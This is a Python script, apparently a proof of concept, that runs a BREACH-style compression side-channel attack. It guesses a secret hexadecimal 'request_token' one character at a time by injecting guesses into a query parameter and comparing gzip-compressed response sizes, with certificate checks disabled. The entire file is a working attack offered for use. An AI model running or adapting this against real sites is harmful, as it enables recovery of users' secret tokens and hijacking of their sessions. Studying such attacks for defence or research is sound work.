import requests
import time
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Replace with the actual URL of the target page
url = 'https://malbot.net/poc/'
# The name of the query parameter to manipulate
param_name = 'request_token'

# All hexadecimal characters to try as possible token characters
possible_chars = '0123456789abcdef'

padding = '{}'

# Initialize the guessed token as an empty string
guessed_token = ''

def get_response_length(guess):
    """
    Sends a request with the given guess and returns the length of the compressed response.

    Args:
        guess (str): The current guessed token.

    Returns:
        int: The length of the compressed response content.
    """
    
    # Construct the full URL with the query parameter
    full_url = f"{url}?{param_name}=%27{guess}"

    # Print the full URL
    # print(f"Fetching URL: {full_url}")

    headers = {
        'Accept-Encoding': 'gzip, deflate'  # Ensure the response is compressed
    }
    try:
        # Send the GET request with the full URL
        response = requests.get(full_url, headers=headers, verify=False, stream=True)
        response.raise_for_status()

        # Disable automatic decompression
        response.raw.decode_content = False

        # Read the raw compressed response content
        compressed_content = response.raw.read()
        compressed_length = len(compressed_content)
        return compressed_length
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None


def guess_token(url, param_name, possible_chars, padding, padding_amount):
    guessed_token = ''
    while True:
        found_char = False

        for c in possible_chars:
            # Get the response length for the current guess
            response_lengths = [
                get_response_length(guessed_token + c + padding*padding_amount + '@'),
                get_response_length(guessed_token + padding*padding_amount + c + '@')
            ]
            if None in response_lengths:
                continue  # Skip to the next character if the request failed
            print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")

            # If the response length decreases, we've guessed the correct character
            if response_lengths[1] > response_lengths[0]:
                print(f"Found character: '{c}'")
                guessed_token += c
                found_char = True
                break  # Proceed to guess the next character

            # time.sleep(0.01)  # Delay to avoid overwhelming the server

        if not found_char:
            print("Could not find the next character. Exiting.")
            break  # Exit if no character causes a decrease in response length

    print(f"Guessed token: '{guessed_token}'")
    return guessed_token


def main():
    # test different padding lengths
    guessed_tokens = {}
    for padding_amount in range(1,11):
        guessed_tokens[padding_amount] = guess_token(url, param_name, possible_chars, padding, padding_amount)
    # sort by number of guessed characters
    for padding_amount, token in sorted(guessed_tokens.items(), key=lambda x: len(x[1]), reverse=True):
        print(f"Padding Amount: {padding_amount}, Token Length: {len(token)}, Token: '{token}'")


if __name__ == '__main__':
    main()


# TODO increase padding amount only when no character is found.